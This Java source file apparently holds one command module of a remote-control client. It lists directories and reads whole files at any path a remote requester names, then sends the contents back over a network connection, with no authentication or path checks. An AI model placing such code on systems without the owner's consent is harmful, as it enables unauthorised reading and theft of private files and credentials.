package Classes.Instructions;

import Classes.Connection;
import Classes.Instruction;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class FileViewer extends Instruction {
    public static String type = "fileview";

    public FileViewer(Connection connection) {
        super(connection, type);
    }

    public void execute(HashMap<String, Object> arguments, String from) throws IOException {
        String todo = (String) arguments.get("todo");
        String path = (String) arguments.get("path");

        if (todo.equals("list")) {
            HashMap<String, Integer> list = listFiles(path);

            String jsonList = json.toJson(list);

            HashMap<String, String> toSend = new HashMap<String, String>();
            toSend.put("type", "reply");
            toSend.put("value", jsonList);
            toSend.put("to", from);

            String finishedString = json.toJson(toSend);

            connection.send(finishedString);
        } else if (todo.equals("read")) {
            String data = readFile(path);

            HashMap<String, String> toSend = new HashMap<String, String>();
            toSend.put("type", "reply");
            toSend.put("value", data);
            toSend.put("to", from);

            String finishedString = json.toJson(toSend);

            connection.send(finishedString);
        }
    }

    private HashMap<String, Integer> listFiles(String path) {
        File file = new File(path);
        File[] files = file.listFiles();

        HashMap<String, Integer> list = new HashMap<String, Integer>();
        
        for (File f : files) {
            list.put(f.getName(), f.isDirectory() ? 1 : 0);
        }

        return list;
    }

    private String readFile(String path) throws IOException {
        try {
            String content = new String(Files.readAllBytes(Paths.get(path)));

            return content;
        } catch (IOException e) {
            return e.toString();
        }
    }

    private void getFileInfo(String path) {
        File myObj = new File(path);
        if (myObj.exists()) {
            System.out.println("File name: " + myObj.getName());
            System.out.println("Absolute path: " + myObj.getAbsolutePath());
            System.out.println("Writeable: " + myObj.canWrite());
            System.out.println("Readable " + myObj.canRead());
            System.out.println("File size in bytes " + myObj.length());
        } else {
            System.out.println("The file does not exist.");
        }
    }
}
